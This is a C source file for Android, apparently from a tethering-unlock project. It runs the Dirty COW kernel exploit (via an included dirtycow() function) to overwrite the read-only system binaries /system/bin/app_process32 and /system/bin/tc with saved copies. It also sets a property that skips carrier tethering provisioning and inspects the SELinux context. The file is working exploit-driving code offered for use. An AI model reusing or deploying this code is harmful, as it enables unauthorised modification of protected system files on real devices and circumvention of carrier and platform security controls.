#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
//#include "lsh.h"



#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define BLOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "reset"

#include "psutils.h"
#include "dirtycow.h"
#define TMPFILE "/data/local/tmp/asdfasdf"
#define OBJ1 "/data/data/com.android.systemui/files/boot.ad"
#define OBJ2 "/data/data/com.android.systemui/files/boot.ad.image"
#define DATADIR "/data/data/com.android.systemui/files"
#define MAX_WAIT 70
#define PROP "net.tethering.noprovisioning"
#define APPPROC_OLD "/data/data/com.example.marto.tether/files/app_process32old"
#define TC_OLD "/data/data/com.example.marto.tether/files/tcold"

int check_context(const char* conn2) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                ALOG("Current Context: %s",conn);
                return (int)(strcmp(conn2,conn) == 0);
            }
        }
    }
    return 0;
}

int remove_fn(const char* fn) {
    int res = remove(fn);
    if (res != -1) {
        ALOG("[pass] REMOVED FILE");
        return 0;
    }
    ALOG("[erro] CAN'T REMOVE FILE %s",fn);
    return 2;
}

int checkdir(const char* d) {
    DIR *dp;
    dp = opendir(d);
    if (dp == NULL) {
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    struct stat st;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            char* fullpath = 0;
            asprintf(&fullpath,"%s/%s",d,ep->d_name);
            if(fullpath) {
                stat(fullpath,&st);
                ALOG("\t%5d:%5d\t%s", st.st_uid, st.st_gid, fullpath);
            } else {
                ALOG("\tXXXXX:XXXXX\t%s", fullpath);
            }

            if (fullpath) {
                free(fullpath);
            }
        }
        closedir(dp);
    } else {
        ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}

void setnetprop() {
    if(property_set(PROP, "true")) {
        ALOG("NOOOOOOOOOOOOOOOOOOOO: could not set property: " PROP);
    }
    return;
}

int main(int argc, char** argv) {
    int rc; //return code
    rc = check_for_dirtycow();
    if(!rc) {
        ALOG("[wait] Dirty Cow is running!");
        return 2;
    }
     while (!check_for_tc()){
         ALOG("tc parent is running :S");
         usleep(100);
     }
    while (!check_for_app()){
         ALOG("app parent is running :S");
         usleep(100);
     }
     ALOG("re-dirtycow app process 32\n");
     char* args[] = {"dirtycow","/system/bin/app_process32",APPPROC_OLD,NULL};
     int arglen = 3;
     dirtycow(arglen,args);
     ALOG("Done\n");
      ALOG("re-dirtycow tc process 32\n");
     char* args2[] = {"dirtycow","/system/bin/tc",TC_OLD,NULL};
     dirtycow(arglen,args2);
     ALOG("Done\n");

    ALOG("###################DONE WITH RESET#####################");
    return 0;
}
